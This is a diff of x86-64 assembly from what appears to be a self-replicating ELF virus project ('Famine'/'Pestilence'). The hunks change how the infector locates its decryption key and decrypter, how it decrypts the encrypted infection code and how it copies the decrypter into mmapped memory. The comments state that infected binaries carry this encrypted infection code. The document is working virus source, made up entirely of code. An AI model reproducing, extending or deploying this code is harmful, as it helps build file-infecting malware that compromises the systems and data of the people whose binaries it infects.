@@ -143,8 +143,8 @@ _check_famine_binary:
 
 ; Take encrypted part size
 	lea rax, [rel _encrypted_part_start] ; take start addr
-	lea rdx, [rel _final_end] ; take end addr
-	add rdx, 2 ; add 2 for the leave/ret
+	lea rdx, [rel _padding] ; take end addr
+;	add rdx, 2 ; add 2 for the leave/ret
 	sub rdx, rax ; substract 
 
 ; Take first non-encrypted part size (_o_entry to _encrypted_part)
@@ -168,8 +168,8 @@ _check_famine_binary:
 ; any padding. So we need to recalculate the _decrypt addr: it's _final_end + 2 (the size of leave/ret instructions) + 256 (key_size)
 ; We don't have any conditions to check if their is a padding, because pestilence base code isn't
 ; encrypted, Only, infect binaries have the infection code encrypted.
-	lea rax, [rel _final_end] ; take _final_end addr
-	add rax, 2 ; add 2, to go on key addr
+	lea rax, [rel _padding] ; take _final_end addr
+;	add rax, 2 ; add 2, to go on key addr
 ; Set parameters
 	mov rdi, rax ; first parameter is the key
 	lea rsi, [rel _encrypted_part_start] ; second parameter is the zone to decrypt
@@ -178,15 +178,13 @@ _check_famine_binary:
 ; mmap_base_addr + unencrypted_copy_size
 	mov r10, QWORD [rsp] ; take mmap base addr
 	add r10, r11 ; take unencrypted_part_size
-	add rax, 256 ; now we add 256 to our key addr, to go on _decrypt
-	call rax ; and we call _decrypt
+;	add rax, 256 ; now we add 256 to our key addr, to go on _decrypt
+	call _decrypt ; and we call _decrypt
 
 ; Now we move our decrypter on our mmap directly after decrypted part + 256 (key_size)
 	mov rdi, QWORD [rsp] ; take mmap addr
 ; Go to _decrypt
-	lea rsi, [rel _final_end]
-	add rsi, 2
-	add rsi, 256
+	lea rsi, [rel _decrypt]
 ; Calculate virus + key total size
 	lea rcx, [rel _o_entry]
 	mov r10, rsi
@@ -196,8 +194,8 @@ _check_famine_binary:
 ; Calculate decrypt size
 	lea rcx, [rel _end_decrypt]
 	add rcx, 2
-	lea r10, [rel _decrypt]
-	sub rcx, r10
+;	lea r10, [rel _decrypt]
+	sub rcx, rsi
 ; Move it on mmap
 	cld
 	rep movsb
